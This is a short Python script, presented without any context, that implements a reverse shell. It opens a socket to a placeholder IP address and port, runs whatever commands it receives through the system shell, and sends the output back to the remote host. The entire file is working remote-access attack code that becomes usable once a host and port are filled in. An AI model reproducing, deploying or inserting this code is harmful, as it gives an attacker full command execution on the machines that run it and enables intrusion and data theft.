import socket
import subprocess

# Create a socket
s = socket.socket()

# Connect to the target host
s.connect(('<IP ADDRESS>', <PORT>))

# Create a process to receive commands
while True:
    # Receive data from the socket
    data = s.recv(1024)
    
    # Execute the command
    proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    
    # Save the output
    stdout_value, stderr_value = proc.communicate()
    
    # Send the output back to the socket
    s.send(stdout_value)
    s.send(stderr_value)

# Close the connection
s.close()
